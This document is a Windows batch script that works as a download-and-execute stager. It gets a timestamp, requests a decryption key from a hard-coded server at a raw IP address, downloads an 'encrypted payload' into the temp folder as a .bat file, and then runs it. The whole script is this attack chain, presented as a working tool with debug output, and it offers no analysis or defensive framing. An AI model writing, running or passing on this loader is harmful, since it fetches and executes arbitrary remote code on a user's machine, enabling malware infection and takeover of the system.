@echo off
setlocal enabledelayedexpansion

set BASE=http://82.29.153.101:8080
set FILE=%temp%\sc.bat

echo [INFO] ===== START =====
echo [INFO] BASE: %BASE%
echo [INFO] OUTPUT FILE: %FILE%

REM ===== TS =====
echo [INFO] Generating timestamp...
for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i

if "%TS%"=="" (
    echo [ERROR] Failed to generate TS
    exit /b 1
)
echo [OK] TS: %TS%

REM ===== KEY =====
echo [INFO] Requesting KEY...
for /f %%i in ('curl -s -w "%%{http_code}" "%BASE%/auth/key?ts=%TS%"') do (
    set RESPONSE=%%i
)

set KEY=%RESPONSE:~0,-3%
set STATUS=%RESPONSE:~-3%

echo [DEBUG] HTTP STATUS: %STATUS%
echo [DEBUG] RAW KEY: %KEY%

if not "%STATUS%"=="200" (
    echo [ERROR] Failed to get KEY (HTTP %STATUS%)
    exit /b 1
)

if "%KEY%"=="" (
    echo [ERROR] KEY is empty
    exit /b 1
)

echo [OK] KEY retrieved

REM ===== PAYLOAD =====
echo [INFO] Downloading payload...

curl -v -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%FILE%"
if %errorlevel% neq 0 (
    echo [ERROR] curl failed downloading payload
    exit /b 1
)

if not exist "%FILE%" (
    echo [ERROR] Payload file not found after download
    exit /b 1
)

for %%A in ("%FILE%") do set SIZE=%%~zA
echo [DEBUG] Payload size: !SIZE! bytes

if "!SIZE!"=="0" (
    echo [ERROR] Payload is empty
    exit /b 1
)

echo [OK] Payload downloaded successfully

REM ===== EXEC =====
echo [INFO] Executing payload...

call "%FILE%"
if %errorlevel% neq 0 (
    echo [ERROR] Payload execution failed with code %errorlevel%
    exit /b 1
)

echo [OK] Execution completed
echo [INFO] ===== END =====

endlocal